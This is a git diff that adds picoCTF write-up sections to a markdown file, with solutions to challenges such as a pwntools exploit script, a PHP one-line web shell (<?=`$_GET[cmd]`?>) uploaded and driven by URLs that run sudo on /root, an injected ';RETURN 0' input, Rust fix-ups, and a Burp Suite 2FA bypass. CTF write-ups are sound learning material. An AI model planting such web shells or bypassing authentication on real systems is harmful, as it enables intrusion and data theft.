@@ -894,4 +894,238 @@ cat .flag.txt
 ```
 
 
+## PIE TIME
+
+```
+from pwn import *  
+  
+hostname ='rescued-float.picoctf.net'
+port = 53223
+p = remote(hostname, port)
+p.recvuntil(b"main: ")  
+main_addr = int(p.recvline().strip(), 16)  
+win_addr = main_addr - 0x96  
+p.sendline(hex(win_addr))  
+p.recvuntil(b"You won!\n")  
+flag = p.recvline()  
+print(flag.strip().decode("utf-8"))  
+p.close()
+```
+
+
+## n0s4n1ty 1
+
+Make a php payload and upload it
+
+```
+<?=`$_GET[cmd]`?>
+```
+
+Now you can run this to get the flag
+```
+http://standard-pizzas.picoctf.net:65172/uploads/shell.php?cmd=sudo%20ls%20-la%20/root
+```
+```
+http://standard-pizzas.picoctf.net:65172/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt
+```
+
+
+## PW Crack 1
+
+On seeing the Python code provided, We can see that the password is being compared with `1e1a`. So entering `1e1a` as the password, we can obtain the flag
+
+
+## PW Crack 2
+
+On seeint the python code provided we can see that the passowrd is written in hex which is converted to chr when comparing. So we can take only that part and run it on python to see what it gives
+
+![alt text](Pictures/PWCrack2.png)
+
+Using this passowrd gives the flag
+
+
+## Flag Hunters
+
+Using input as this gives the flag
+
+```
+;RETURN 0
+```
+
+
+## Rust fixme 1
+
+The code has errors, So fix the code: 
+
+This is the fixed code
+
+```
+use xor_cryptor::XORCryptor;
+
+fn main() {
+    // Key for decryption
+    let key = String::from("CSUCKS"); // <-- Added missing semicolon
+
+    // Encrypted flag values
+    let hex_values = [
+        "41", "30", "20", "63", "4a", "45", "54", "76", "01", "1c", "7e", "59",
+        "63", "e1", "61", "25", "7f", "5a", "60", "50", "11", "38", "1f", "3a",
+        "60", "e9", "62", "20", "0c", "e6", "50", "d3", "35"
+    ];
+
+    // Convert the hexadecimal strings to bytes and collect them into a vector
+    let encrypted_buffer: Vec<u8> = hex_values.iter()
+        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
+        .collect();
+
+    // Create decryption object
+    let res = XORCryptor::new(&key);
+    if res.is_err() {
+        return; // <-- Fixed from `ret` to `return`
+    }
+    let xrc = res.unwrap();
+
+    // Decrypt flag and print it out
+    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
+    println!(
+        "{}", // <-- Fixed `:?` to `"{}"` and use correct formatting
+        String::from_utf8_lossy(&decrypted_buffer)
+    );
+}
+```
+
+Compile with
+```
+cargo build
+cargo run
+```
+
+
+## Rust fixme 2
+
+The code has errors, So fix the code: 
+
+This is the fixed code
+
+```
+use xor_cryptor::XORCryptor;
+
+fn decrypt(encrypted_buffer: Vec<u8>, borrowed_string: &mut String) {
+    // Key for decryption
+    let key = String::from("CSUCKS");
+
+    // Editing our borrowed value
+    borrowed_string.push_str("PARTY FOUL! Here is your flag: ");
+
+    // Create decryption object
+    let res = XORCryptor::new(&key);
+    if res.is_err() {
+        return;
+    }
+    let xrc = res.unwrap();
+
+    // Decrypt flag and print it out
+    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
+    borrowed_string.push_str(&String::from_utf8_lossy(&decrypted_buffer));
+    println!("{}", borrowed_string);
+}
+
+fn main() {
+    // Encrypted flag values
+    let hex_values = [
+        "41", "30", "20", "63", "4a", "45", "54", "76", "01", "1c", "7e", "59",
+        "63", "e1", "61", "25", "0d", "c4", "60", "f2", "12", "a0", "18", "03",
+        "51", "03", "36", "05", "0e", "f9", "42", "5b"
+    ];
+
+    let encrypted_buffer: Vec<u8> = hex_values.iter()
+        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
+        .collect();
+
+    let mut party_foul = String::from("Using memory unsafe languages is a: ");
+    decrypt(encrypted_buffer, &mut party_foul);
+}
+
+```
+
+Compile with
+```
+cargo build
+cargo run
+```
+
+
+## Rust fixme 3
+
+The code has errors, So fix the code: 
+
+This is the fixed code
+
+```
+use xor_cryptor::XORCryptor;
+
+fn decrypt(encrypted_buffer: Vec<u8>, borrowed_string: &mut String) {
+    // Key for decryption
+    let key = String::from("CSUCKS");
+
+    // Editing our borrowed value
+    borrowed_string.push_str("PARTY FOUL! Here is your flag: ");
+
+    // Create decryption object
+    let res = XORCryptor::new(&key);
+    if res.is_err() {
+        return;
+    }
+    let xrc = res.unwrap();
+
+    // Decrypt the flag
+    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
+
+    // No need for unsafe: String::from_utf8_lossy handles invalid UTF-8 safely
+    borrowed_string.push_str(&String::from_utf8_lossy(&decrypted_buffer));
+
+    println!("{}", borrowed_string);
+}
+
+fn main() {
+    // Encrypted flag values
+    let hex_values = [
+        "41", "30", "20", "63", "4a", "45", "54", "76", "12", "90", "7e", "53", "63", "e1",
+        "01", "35", "7e", "59", "60", "f6", "03", "86", "7f", "56", "41", "29", "30", "6f",
+        "08", "c3", "61", "f9", "35"
+    ];
+
+    // Convert the hexadecimal strings to bytes
+    let encrypted_buffer: Vec<u8> = hex_values.iter()
+        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
+        .collect();
+
+    let mut party_foul = String::from("Using memory unsafe languages is a: ");
+    decrypt(encrypted_buffer, &mut party_foul);
+}
+
+```
+
+Compile with
+```
+cargo build
+cargo run
+```
+
+
+## IntroToBurp
+
+First enter anything it doesnt matter.
+Then on the 2FA page use BurpSuite `https://portswigger.net/burp/releases/professional-community-2025-2-4`
+
+Open the Proxy tab and open Intercept
+
+![alt text](Pictures/BurpSuite1.png)
+
+Remove the OTP and forward the request
+
+![alt text](Pictures/BurpSuite2.png)
+
+
+
 ## 
